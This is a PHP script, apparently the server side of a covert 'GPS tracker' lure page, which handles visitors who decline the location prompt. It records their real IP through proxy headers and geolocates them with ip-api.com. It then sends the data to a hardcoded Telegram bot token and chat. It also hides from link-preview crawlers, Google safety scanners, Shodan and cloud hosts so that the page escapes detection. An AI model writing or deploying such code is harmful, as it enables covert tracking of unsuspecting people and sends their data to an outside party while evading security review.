<?php
// ============================================================
// GPS DENIED TRACKER - ANTI-BOT EDITION
// ============================================================

// 1. Anti-bot / crawler (Clean User-Agent check)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
    exit();
}

// 2. Configuration
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";

// Receive Error Data from JavaScript safely
$status = htmlspecialchars($_POST['Status'] ?? 'failed', ENT_QUOTES, 'UTF-8');
$error_msg = htmlspecialchars($_POST['Error'] ?? 'Unknown Error', ENT_QUOTES, 'UTF-8');

// 3. Get Real IP (Bypassing Proxies)
function getRealIpAddr() {
    $headers = [
        'HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_INCAP_CLIENT_IP',
        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED', 'REMOTE_ADDR'
    ];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            foreach (explode(',', $_SERVER[$header]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}
$ip = getRealIpAddr();

// ============================================================
// 4. ADVANCED ANTI-BOT: Data Center & Cloud Blocker
// ============================================================
if ($ip !== 'Unknown') {
    $hostname = @gethostbyaddr($ip);
    if ($hostname && $hostname !== $ip) {
        $blockedHosts = [
            'amazonaws.com', 'googleusercontent.com', 'googlebot.com', 
            'search.msn.com', 'compute.internal', 'linode.com', 
            'digitalocean.com', 'shodan.io', 'onrender.com'
        ];
        foreach ($blockedHosts as $blocked) {
            if (stripos($hostname, $blocked) !== false) {
                exit(); // Silently kill the script for data center bots
            }
        }
    }
}
// ============================================================

// 5. Get IP Intelligence (Using safe cURL instead of file_get_contents)
$city = "Unknown";
$country = "Unknown";

if ($ip !== 'Unknown') {
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $json = curl_exec($ch);
    curl_close($ch);
    
    if ($json) {
        $geo = json_decode($json, true);
        if ($geo && isset($geo['status']) && $geo['status'] == 'success') {
            $city = $geo['city'] ?? "Unknown";
            $country = $geo['country'] ?? "Unknown";
        }
    }
}

// 6. Format the Telegram Alert
$message = "<b>⚠️ LOCATION DENIED / FAILED</b>\n\n";
$message .= "<b>🚫 Error:</b> <code>" . $error_msg . "</code>\n";
$message .= "<b>🌐 IP:</b> <code>" . $ip . "</code>\n";
$message .= "<b>📍 Last Known Area:</b> " . $city . ", " . $country . "\n\n";
$message .= "<i>The user saw the prompt but did not share GPS.</i>";

// 7. Send to Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
?>
